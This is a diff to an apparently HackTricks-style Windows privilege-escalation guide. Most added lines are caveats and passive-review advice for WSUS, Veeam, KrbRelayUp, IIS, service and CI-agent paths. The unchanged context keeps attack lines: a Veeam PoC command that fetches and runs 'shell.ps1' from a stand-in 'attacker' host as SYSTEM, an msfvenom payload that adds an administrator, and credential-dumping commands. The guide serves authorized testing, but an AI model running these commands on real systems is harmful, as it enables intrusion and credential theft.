@@ -44,6 +44,12 @@ There are different things in Windows that could **prevent you from enumerating 
 ../authentication-credentials-uac-and-efs/
 {{#endref}}
 
+Physical access can also turn an offline UEFI NVRAM edit into pre-boot DMA and a Windows `SYSTEM` memory-patching chain:
+
+{{#ref}}
+../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
+{{#endref}}
+
 ### Admin Protection / UIAccess silent elevation
 
 UIAccess processes launched through `RAiLaunchAdminProcess` can be abused to reach High IL without prompts when AppInfo secure-path checks are bypassed. Check the dedicated UIAccess/Admin Protection bypass workflow here:
@@ -92,7 +98,9 @@ This [site](https://msrc.microsoft.com/update-guide/vulnerability) is handy for 
 - _post/windows/gather/enum_patches_
 - _post/multi/recon/local_exploit_suggester_
 - [_watson_](https://github.com/rasta-mouse/Watson)
-- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_
+- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — inventories the OS build, installed updates, and selected advisory candidates; verify the exact product and superseding updates before treating a result as applicable.
+
+For a version-specific local exploit, check the **running process architecture** as well as the OS architecture. On 64-bit Windows, a 32-bit process is subject to [WOW64 file-system redirection](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` usually resolves to the 32-bit system directory, while `%windir%\Sysnative` gives that process access to the native system directory. The alias is unavailable to a 64-bit process. An OS build or missing-KB candidate does not prove exploitability; compare the running build, installed or superseding update, process architecture, and exploit prerequisites with the [Microsoft security bulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) for the exact issue.
 
 **Locally with system information**
 
@@ -143,6 +151,8 @@ dir C:\Transcripts
 Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
 Stop-Transcript
 ```
+
+`C:\Transcripts` is only an example. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) normally writes under each user's Documents folder, but an `OutputDirectory` setting or `Start-Transcript -OutputDirectory` can redirect files to a shared or hidden folder. Check the effective output path and file ACL before reviewing a transcript: it may contain command arguments and output, including credentials. A readable transcript is a lead only when its contents disclose a usable higher-privilege identity and that identity can log on in the relevant context.
 
 ### PowerShell Module Logging
 
@@ -198,7 +208,7 @@ Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| 
 
 ## WSUS
 
-You can compromise the system if the updates are not requested using http**S** but http.
+An HTTP WSUS endpoint is a review lead for update-metadata interception. Exploitation also depends on whether the client uses that WSUS server, whether an attacker can intercept or control its traffic, and the client's update trust and installation policy. The URL alone does not establish code execution. [Microsoft recommends TLS for WSUS metadata](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).
 
 You start by checking if the network uses a non-SSL WSUS update by running the following in cmd:
 
@@ -229,7 +239,7 @@ PSProvider   : Microsoft.PowerShell.Core\Registry
 
 And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.
 
-Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.
+When `UseWUServer` is `1`, the configured intranet service is used by Windows Update. This confirms a prerequisite for the HTTP interception path, but does not prove that interception, malicious-update acceptance, or elevated installation is possible. When it is `0`, this particular configured WSUS endpoint is not selected by that policy.
 
 In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.
 
@@ -249,6 +259,10 @@ Basically, this is the flaw that this bug exploits:
 > Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.
 
 You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).
+
+### WSUS administrator-controlled updates
+
+A separate path exists when the current identity can **publish and approve** updates on a WSUS server. Check effective membership of the server's `WSUS Administrators` group and any delegated WSUS permissions, then identify the client computer group that would receive an approved update. [Microsoft requires WSUS Administrator privileges to approve updates](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), and [documents the publishing trust relationship](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): clients must trust the signing certificate used for locally published content. Confirm that the candidate update is signed and accepted, applicable to the target, and installed in a more privileged context before treating this as an escalation path. An HTTP `WUServer` value or group name alone does not establish those conditions.
 
 ### SUSDB custom-update abuse: unsigned payloads via `.txt`/`.esd`
 
@@ -332,19 +346,22 @@ abusing-auto-updaters-and-ipc.md
 
 ## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)
 
-Veeam B&R < `11.0.1.1261` exposes a localhost service on **TCP/9401** that processes attacker-controlled messages, allowing arbitrary commands as **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>
+Veeam Backup & Replication and Cloud Connect use a core backup service on **TCP/9401 by default**. [Veeam's advisory](https://www.veeam.com/kb4424) describes unauthenticated disclosure of encrypted configuration-database credentials within the backup network perimeter; a separate public PoC demonstrates a command-execution path as **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> The service may bind beyond localhost, so check its actual address and PID.
 
-- **Recon**: confirm the listener and version, e.g., `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
+- **Recon**: confirm that TCP/9401 belongs to `Veeam.Backup.Service.exe`, then inspect the installed product and patch metadata. `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` are clues, not a complete patch check.
+- **Fixed floors**: Veeam lists **11a build 11.0.1.1261 P20230227** and **12 build 12.0.0.1420 P20230223** as the first fixed releases; earlier releases are affected. A four-part file version alone cannot distinguish an unpatched base build from a later patch on those same build numbers. Verify the patch identifier against the [vendor build history](https://www.veeam.com/kb2680) before calling a boundary build fixed.
 - **Exploit**: place a PoC such as `VeeamHax.exe` with the required Veeam DLLs in the same directory, then trigger a SYSTEM payload over the local socket:
 
 ```powershell
 .\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
 ```
 
-The service executes the command as SYSTEM.
+The cited PoC demonstrates command execution as SYSTEM when its additional prerequisites hold; the vendor's advisory describes the credential-disclosure issue.
 ## KrbRelayUp
 
-A **local privilege escalation** vulnerability exists in Windows **domain** environments under specific conditions. These conditions include environments where **LDAP signing is not enforced,** users possess self-rights allowing them to configure **Resource-Based Constrained Delegation (RBCD),** and the capability for users to create computers within the domain. It is important to note that these **requirements** are met using **default settings**.
+A local Kerberos relay can cross from a lower-privileged logon to a privileged directory write when a suitable COM server authenticates and the relayed principal has rights on the target object. [KrbRelay documents](https://github.com/cube0x0/KrbRelay) both RBCD and `msDS-KeyCredentialLink` (shadow-credential) LDAP writes; KrbRelayUp automates some of these paths. An RBCD chain requires applicable delegation and target-object rights, while a shadow-credential chain requires key-credential write rights and a KDC that supports the certificate authentication path. Neither path follows from domain membership alone.
+
+Check the actual DC's [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) and [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) policy, the relayed identity's object ACL, and the selected COM class's authentication and impersonation levels. The caller's logon type and credential context matter: a WinRM session can behave differently from an interactive or new-credentials logon. Firewall/OXID routing and installed updates can change the result too. Treat a permissive policy or matching ACL as a review candidate; passive enumeration should not trigger COM coercion, relay authentication, or directory writes. A machine-account shadow credential may lead to a machine ticket and, only if that account has the required directory replication rights, a separate DCSync path.
 
 Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)
 
@@ -567,6 +584,8 @@ Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
 
 Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).
 
+A debugger listener can be short-lived, so its absence from one passive port snapshot does not prove it was never exposed. Correlate any observed listener with its PID, process owner, and the lower-privileged user's ability to reach it; an application name or debug flag alone does not establish cross-user code execution. Keep routine enumeration passive rather than sending debugger commands.
+
 **Checking permissions of the processes binaries**
 
 ```bash
@@ -588,6 +607,34 @@ todos %username%" && echo.
 )
 ```
 
+### Snort dynamic preprocessor directories
+
+Snort 2 can load shared libraries from a `dynamicpreprocessor directory` declared in the configuration selected with `snort.exe -c <config>`. For a scheduled task or service that runs Snort under a different account, inspect that exact configuration and the declared module directory ACL. If your token can create files there, the path is a review candidate for code execution when that task or service next loads modules. Verify the run-as account's effective privileges, the active configuration, module compatibility, and any deny or share restrictions; a writable directory alone does not establish escalation. [Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) describes runtime module loading.
+
+### Privileged web service with a writable document root
+
+On a Windows Apache installation, compare the service's executable path and run-as account with the `DocumentRoot` in its active `httpd.conf`. For a conventional XAMPP layout, inspect `C:\xampp\apache\conf\httpd.conf` and the ACL on its configured document root, often `C:\xampp\htdocs`. If a lower-privileged user can create files in that root while Apache runs as `LocalSystem`, server-side code execution may cross the host privilege boundary. Confirm the service is running, that the exact path is served, and that a server-side handler processes the file type; a writable root by itself proves only file creation. Inspect ACLs without writing a probe:
+
+```powershell
+Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
+Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
+icacls 'C:\xampp\htdocs'
+```
+
+For a conventional WAMP installation, the service may point to a versioned `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (or `C:\wamp\...` for a 32-bit layout), with configuration beside it under `conf\httpd.conf` and a default `C:\wamp64\www` or `C:\wamp\www` root. Check the exact service image, its run-as identity, the effective `DocumentRoot` (including `${INSTALL_DIR}` expansion and virtual-host overrides), and the root ACL together. A writable WAMP directory does not establish that Apache runs as `SYSTEM` or executes the submitted file. [Apache documents how a Windows service selects its configuration](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).
+
+### Writable IIS root and application-pool network identity
+
+For IIS, map a writable physical directory to an **active site/application** in `applicationHost.config`, then identify its configured pool and server-side handler. Code placed in a served directory runs as the pool only if IIS processes that file type and the route is reachable. Check the current user's effective create-file access, site runtime state, handler and per-path overrides before treating a writable directory as code execution.
+
+ASP.NET dynamic compilation introduces a separate path to review: generated files under the application's compilation directory. The default is a `Temporary ASP.NET Files` directory beneath the relevant .NET Framework installation, but the application's `<compilation tempDirectory>` can change it. [Microsoft documents the location and per-application subdirectories](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) and [recommends isolating compilation directories when application pools do not trust each other](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). If a lower-privileged token can alter generated source in the **specific** application's cache, determine whether that application recompiles it under a more privileged [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). A file or directory ACL alone does not prove code execution: correlate the cache with the active application, effective token and ACL, compilation settings, process identity, and timing of any recompile. Use read-only metadata review; do not trigger compilation or alter cache files during enumeration.
+
+An IIS pool configured as `ApplicationPoolIdentity` or `NetworkService` commonly authenticates to domain resources as the **host computer account**, even though its local token may be low-privileged. `LocalSystem` is already highly privileged locally and also uses the computer account on the network; `LocalService` normally presents anonymous network credentials. A `SpecificUser` pool uses its configured account instead. [Microsoft documents these identity types](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) and [the application-pool network identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). An omitted identity setting can inherit pool defaults, which differ across IIS generations, so resolve the effective configuration instead of guessing from the pool name. If code execution reaches a pool with computer-account network identity, assess that **specific computer's** directory rights. [DCSync](../active-directory-methodology/dcsync.md) requires replication rights on the domain naming context; a machine-account ticket or host role alone does not prove them. Passive enumeration should inspect configuration and ACLs without uploading a file, making a network authentication, or requesting tickets.
+
+For a readable ASP.NET handler that starts a helper process, trace any request-derived value through authentication, decryption, validation, and command construction. A handler that concatenates a decoded token into `ProcessStartInfo("cmd", "/c ...")` may let shell metacharacters change the command; [Microsoft documents `cmd`'s special characters](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Establish that an untrusted caller can actually influence the decoded value and reach the handler, then resolve the effective application-pool or impersonated identity and the child process's identity. A readable source line, a localhost listener, or a token-format weakness alone does not prove privileged command execution. Review source and pool configuration without sending forged requests or running the helper during passive enumeration.
+
+For a PHP service on Windows, a request-controlled path passed to [`include` or `require`](https://www.php.net/manual/en/function.include.php) can evaluate a lower-user-writable PHP file under the worker's identity. Confirm that the request can reach that statement, the resolved path names a file the lower user can modify and the worker can read, applicable PHP path restrictions permit the include, and the worker actually runs with higher privileges. A loopback listener or writable file alone does not establish this chain; inspect the source, service identity, and file ACLs without invoking the endpoint during passive enumeration.
+
 ### Memory Password mining
 
 You can create a memory dump of a running process using **procdump** from sysinternals. Services like FTP have the **credentials in clear text in memory**, try to dump the memory and read the credentials.
@@ -602,7 +649,25 @@ procdump.exe -accepteula -ma <proc_name_tasklist>
 
 Example: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"
 
+### Privileged project-file import
+
+An application that automatically opens projects from a lower-user-writable drop directory crosses an input trust boundary under the importer's account. Review the **exact writable path**, the process or task that opens it, its effective identity, and the parser build. A [historical Ghidra project open/restore issue](https://github.com/NationalSecurityAgency/ghidra/issues/71) allowed XML external entities in project metadata; a network entity on Windows could cause authentication from the importing account if [outbound SMB and NTLM policy](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) permit it. That is a credential-exposure lead, not immediate administrator access: the response must be usable through a separate authorized or vulnerable path, and current builds must be assessed against their actual patch state. Do not open a crafted project during passive enumeration; inspect the import workflow and ACLs.
+
 ## Services
+
+The Service Control Manager (SCM) object's [`SC_MANAGER_CREATE_SERVICE` right](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) is separate from rights on an existing service. A successful read-only [`OpenSCManager` access request](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) for that right is a review lead, not proof that a new service can run. [`CreateService` returns a handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) with the service access requested at creation; later reopening the service performs a separate access check and may fail even when the original handle could be used. Verify the effective local or remote token, granted handle rights, service account, start policy, and executable path separately. Do not create or start a service during passive enumeration.
+
+For a remote service-install path, correlate those SCM rights with a share on the target that the **same network logon** can write, its underlying NTFS ACL, and a local executable path that the service account can run. A non-admin account can cross this boundary if unusually broad SCM rights and the file-placement path both exist; an administrative share is not an inherent prerequisite. Share write access alone, or an SCM create-service lead alone, does not establish that the new service can start under a higher identity.
+
+An existing service may invoke a helper executable on startup, shutdown, or another lifecycle event even when that helper is absent from its `ImagePath`. If the helper name is resolved into a lower-user-writable directory and the service runs under a higher identity, a missing helper file is a conditional replacement candidate. Confirm the **actual service code or documented helper invocation**, the resolved executable path and search order, directory creation rights, service identity, and an available lifecycle trigger. A writable service directory or a missing file alone does not establish that the service loads the file; passive review should not start or stop the service.
+
+For an existing service, [`SERVICE_START` permits supplying arguments to `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); it is distinct from [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Review the service's code or documented interface before treating start access as more than a control right. If it uses a caller-selected argument as a log or export path, verify the service identity, exact argument-to-write flow, path restrictions, and the permissions of the **created file**. A write into a protected directory can become escalation only with a separate privileged consumer or loader that accepts that file; a writable log or start right alone is insufficient. Passive inventory should not start the service or create a test file.
+
+For an NSClient++ monitoring agent, a readable `nsclient.ini` is a **configuration review lead**: it may hold web credentials, while `boot.ini` can redirect the configuration to another location. Check the actual service account, WEB listener and access policy, and whether the authenticated role can change settings or scripts. Privileged execution additionally requires `CheckExternalScripts` (or another enabled execution path), an effective right to register or modify a command, and a trigger that runs it under the service identity. A loopback-only listener can still be reachable to a local user, but the file path, password, or listener alone does not establish those rights. Review metadata and permissions without displaying secrets or invoking the web API during passive enumeration. See the [NSClient++ file layout](https://nsclient.org/docs/concepts/file-layout/), [web and script security guidance](https://nsclient.org/docs/setup/securing/), and [external-script configuration](https://nsclient.org/docs/reference/check/CheckExternalScripts/).
+
+For a service whose `ImagePath` is `nssm.exe`, inspect the service's actual run-as account and its `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` value: [NSSM stores the child application there](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), while `AppDirectory` is its configured working directory. Check the child executable and its parent-directory ACLs before treating the wrapper's permissions as the whole service boundary. A local WCF or SOAP endpoint exposed by that child is a separate review lead: confirm the listener is reachable by the lower-privileged user, the exact operation accepts their input, and the service child executes the unsafe operation under a higher identity. The service account, an endpoint URL, or a writable path alone does not prove escalation; avoid invoking service operations during passive enumeration.
+
+For a custom WCF operation, trace a caller-controlled string into any PowerShell runspace. [`Pipeline.Commands.AddScript` adds script text](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), and [`Pipeline.Invoke` runs the pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). A [`netTcpBinding` with Windows transport credentials](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) authenticates the client, but authorization to call that **specific** operation and the runspace's effective identity must be checked separately. A path from a lower-privileged caller's input to `AddScript` under a higher service identity is a code-execution boundary; a listening port, authenticated client, or unused method in an unrelated assembly alone is not proof. Review the deployed service, contract, authorization, and impersonation settings statically without invoking the endpoint during enumeration.
 
 Service Triggers let Windows start a service when certain conditions occur (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Even without SERVICE_START rights you can often start privileged services by firing their triggers. See enumeration and activation techniques here:
 
@@ -610,6 +675,12 @@ Service Triggers let Windows start a service when certain conditions occur (name
 {{#ref}}
 service-triggers.md
 {{#endref}}
+
+### Visual Studio diagnostic collector service
+
+Visual Studio installations with C/C++ tooling may include `VSStandardCollectorService150`, a diagnostic service configured to run as `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) used a junction and object-manager-link race to redirect a service DACL reset. The demonstrated escalation also required a usable Visual Studio Setup WMI Provider MSI repair path and its `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` target. The component was fixed in January 2024.
+
+For passive triage, inspect that one service's account and binary path, check whether the Setup WMI compiler path exists, and verify the installed component's patch status. A service entry, Visual Studio product version, or compiler file alone does not establish that the host is vulnerable. Inspection need not start the service or run a repair.
 
 Get a list of services:
 
@@ -754,7 +825,7 @@ for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\
 get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
 ```
 
-It should be checked whether **Authenticated Users** or **NT AUTHORITY\INTERACTIVE** possess `FullControl` permissions. If so, the binary executed by the service can be altered.
+Review whether **Authenticated Users** or **NT AUTHORITY\INTERACTIVE** have write-capable registry permissions on a particular service key. An ACL entry alone does not prove effective access: deny entries, the current token, and inherited permissions matter. Registry-key rights are separate from the service object's `SERVICE_CHANGE_CONFIG` and `SERVICE_START` rights. Escalation also requires a usable service configuration field, a way to trigger the service, and a more privileged service identity. See Microsoft's [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) and [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).
 
 To change the Path of the binary executed:
 
@@ -847,6 +918,20 @@ msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f ex
 
 Windows allows users to specify actions to be taken if a service fails. This feature can be configured to point to a binary. If this binary is replaceable, privilege escalation might be possible. More details can be found in the [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).
 
+## Scheduled task script targets
+
+For an enabled task that runs `cmd.exe /c` with a `.bat` or `.cmd` file, check the script named in the **action arguments** as well as `cmd.exe`. The same applies to an interpreter's explicit file argument, such as PowerShell `-File`. If a scheduled batch file contains a literal PowerShell `-File` call, inspect that referenced script's ACL too; variables, conditionals, and shell chaining require manual tracing. A caller-writable script or parent directory is a cross-account execution lead only when the configured task principal differs from the caller and the task actually reaches that action. An append-only ACL can matter for scripts, but an earlier `exit` or other control flow may make appended lines unreachable. Confirm effective ACLs, [task execution context](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), working directory, trigger, and application-control policy before claiming escalation. Inventory should not modify the script or start the task.
+
+## Named streams on accessible files
+
+On NTFS, a readable file can have a named `:$DATA` stream whose contents are not shown by an ordinary directory listing. For a small, relevant set of accessible backups or configuration files, review stream **names and sizes** before opening any content; Windows exposes them through [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), and PowerShell's [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). A stream name suggesting a secret is only a lead. Check the file's effective read access, the filesystem's stream support, whether the stream contains usable credentials, and the account they actually authenticate as. Avoid recursive stream scans and printing stream contents during routine enumeration.
+
+## Scheduled Windows Driver Kit helper inputs
+
+The optional Windows Driver Kit includes `StandaloneRunner.exe`, which can consume `command.txt`, `reboot.rsf`, and a project `working\rsf.rsf` file from its run directory. A scheduled task or service that starts this helper with a privileged account can turn low-privilege write access to those inputs into command execution in that account's context, even when the helper executable itself is protected. Confirm the privileged consumer and that **both** sidecar files can be created or modified; finding the helper alone is insufficient.
+
+For a scheduled task, inspect its action's [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) and the ACLs of the two sidecar paths. If the task does not specify a working directory, the executable's directory is only a lead to verify, not proof of where the task reads its inputs. The project working-file prerequisite must also be satisfied. Check the actual task principal rather than assuming it runs as SYSTEM.
+
 ## Applications
 
 ### Installed Applications
@@ -861,6 +946,30 @@ reg query HKEY_LOCAL_MACHINE\SOFTWARE
 Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
 Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
 ```
+
+#### Checkmk Windows agent repair path
+
+[CVE-2024-0670](https://checkmk.com/werk/16361) affects older Checkmk Windows agents that wrote command files in `C:\Windows\Temp` and then executed a pre-existing write-protected file when replacement failed. The vendor fixed the issue in 2.1.0p40, 2.2.0p23, 2.3.0b1, and 2.4.0b1. Check the full installed patch level and whether the affected agent operation can run; a branch-only label such as `2.1` cannot establish exposure. Enumeration can inspect version, service state, and Temp permissions without creating files or triggering agent commands.
+
+#### ADSelfService Plus SAML service review
+
+[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) affected ADSelfService Plus build 6210 and earlier; the vendor fixed it in build 6211. It is relevant only if SAML SSO **is or was** enabled. An installed-product entry or service path is therefore a lead, not a vulnerability verdict: confirm the exact build, the SAML configuration history, network reachability of the service, and the account it runs under. Code execution through the service inherits that account's privileges; SYSTEM execution requires a SYSTEM-run instance. A readable `OfflineBackup_*.ezip` in the product's Backup directory is a separate encrypted backup lead, not evidence of a usable credential or this SAML flaw. Record its path and access rights without unpacking it during routine enumeration.
+
+#### Jenkins controller and domain-account boundaries
+
+On a Windows Jenkins controller, distinguish permission to create or configure a job from permission to start it: [Jenkins documents these as separate `Job/Create`, `Job/Configure`, and `Job/Build` rights](https://www.jenkins.io/doc/book/security/access-control/permissions/). A configured schedule or remote trigger may provide another build route, but confirm that it is enabled and the build actually runs. Execution has the identity of the controller or selected agent, and a stored credential is usable only if the job can access its scope. Separately, inspect access to `JENKINS_HOME` metadata: Jenkins keeps credential material and encryption keys in `credentials.xml`, `secrets/hudson.util.Secret`, and `secrets/master.key` ([Jenkins secret storage](https://www.jenkins.io/doc/developer/security/secrets/)). Their presence alone does not reveal a password; verify **read access to the required files** and a distinct account-reuse path without printing secrets in shared output. If that account has an AD user-object `scriptPath` write right, confirm a writable script path and a real logon or scheduled consumer running as the target user before treating it as cross-user execution. Further group control requires separately verified effective AD rights.
+
+#### Azure Pipelines self-hosted agent identity
+
+For an Azure DevOps Server or Azure Pipelines project, separate permission to **create or edit** a pipeline from permission to **queue** it and use the selected agent pool; [Microsoft documents pipeline permissions](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) and [pool authorization](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) independently. If a lower-privileged account can submit a script step and run that pipeline on a self-hosted Windows agent, the step executes as the [agent's configured operating-system account](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Verify the exact pipeline, branch/resource restrictions, authorized pool, runnable job, and agent service identity before claiming a cross-user or SYSTEM transition. An installed agent, project role, or repository write alone is only a lead; review permissions and local service metadata without starting a build during passive enumeration.
+
+#### Microsoft Entra Connect Sync credentials
+
+[Microsoft distinguishes](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) the **ADSync service account**, which runs the synchronization service and accesses its SQL database, from the **AD DS connector account**, whose directory permissions depend on the configured sync features. Connector credentials are stored encrypted in that database, with key material [protected by DPAPI under the ADSync service account](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). An installed sync service, a local administrator-sounding group, or database visibility alone does not establish a decryptable credential or domain escalation. Review the actual database read rights, service-account/key access, installation and SQL layout, configured connector identity, and that identity's effective AD privileges separately. Routine enumeration should show only service and access metadata, not query or print the stored secrets.
+
+#### Printer driver support DLL permissions
+
+An installed printer driver may keep support DLLs under `C:\ProgramData` and load them in a more privileged print process. Review the exact driver directory and DLL ACLs, including parent directories and reparse points, even if printer WMI enumeration is denied. For the [Ricoh printer-driver issue CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), the reported path was `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [the original disclosure](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) describes DLL loading by `PrintIsolationHost.exe`. A writable ACL is only a lead: verify effective write access after deny entries, that the relevant driver is installed and loads the file under a privileged identity, and whether the vendor's updated driver or security program has fixed the installation. Do not infer vulnerability from the directory name or driver version alone.
 
 ### Write Permissions
 
@@ -923,6 +1032,10 @@ If a driver exposes an arbitrary kernel read/write primitive (common in poorly d
 
 {{#ref}}
 arbitrary-kernel-rw-token-theft.md
+{{#endref}}
+
+{{#ref}}
+windows-kernel-rootkits-and-dkom.md
 {{#endref}}
 
 For race-condition bugs where the vulnerable call opens an attacker-controlled Object Manager path, deliberately slowing the lookup (using max-length components or deep directory chains) can stretch the window from microseconds to tens of microseconds:
@@ -1146,6 +1259,8 @@ Check for **restricted services** from the outside
 netstat -ano #Opened ports?
 ```
 
+For a local listener, correlate its PID with the process owner, executable path, and any service or scheduled task that starts it. A remote-control service can give access as its desktop user only if its authentication and command controls permit it. A custom TCP application running as a higher-privileged account is a separate review target: the listener and binary path are passive leads, while an authenticated memory-corruption route requires analysis of that exact binary and its reachable input. If an exposed port appears to belong to a system process, compare it with [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) before attributing the backend service; a forwarding rule alone does not prove the destination is reachable or vulnerable.
+
 ### Routing Table
 
 ```
@@ -1188,6 +1303,8 @@ To easily start bash as root, you can try `--default-user root`
 
 You can explore the `WSL` filesystem in the folder `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`
 
+Linux `root` inside WSL does not by itself grant Windows Administrator rights. If the current Windows identity can read a distribution's filesystem, review shell-history files (including `/root/.bash_history`) for commands that may have recorded credentials; escalation still requires a valid higher-privilege account and an allowed authentication path. The `LocalState\rootfs` layout applies to older WSL installations; WSL 2 commonly stores the distribution in an [`ext4.vhdx` virtual disk](https://learn.microsoft.com/en-us/windows/wsl/disk-space), so first identify the actual distribution and storage path. Avoid printing history contents during automated enumeration.
+
 ## Windows Credentials
 
 ### Winlogon Credentials
@@ -1203,6 +1320,8 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDef
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
 ```
+
